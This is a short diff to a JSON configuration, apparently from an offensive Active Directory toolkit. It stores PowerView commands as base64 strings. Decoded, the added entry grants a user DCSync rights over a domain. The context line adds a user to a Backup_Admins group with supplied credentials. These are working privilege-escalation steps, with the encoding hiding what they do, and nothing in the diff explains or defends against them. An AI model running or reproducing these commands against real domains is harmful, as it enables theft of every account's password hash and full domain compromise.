@@ -23,6 +23,12 @@
             "commands": [
                 "JGNyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdoZXJtYW4nLCRVc2VyUGFzc3dvcmQpCkFkZC1Eb21haW5Hcm91cE1lbWJlciAtaWRlbnRpdHkgJ0JhY2t1cF9BZG1pbnMnIC1tZW1iZXJzIGhlcm1hbiAtY3JlZGVudGlhbCAkY3JlZA=="
             ]
+        },
+        "powerview_add_dcsync_rights": {
+            "description": "Add DCSync rights to a user in which you have WriteDACL to",
+            "commands": [
+                "QWRkLU9iamVjdEFDTCAtUHJpbmNpcGFsSWRlbnRpdHkgam9obiAtY3JlZGVudGlhbCAkY3JlZGVudGlhbCAtcmlnaHRzIERDU3luYw=="
+            ]
         }
     },
     "configuration": {
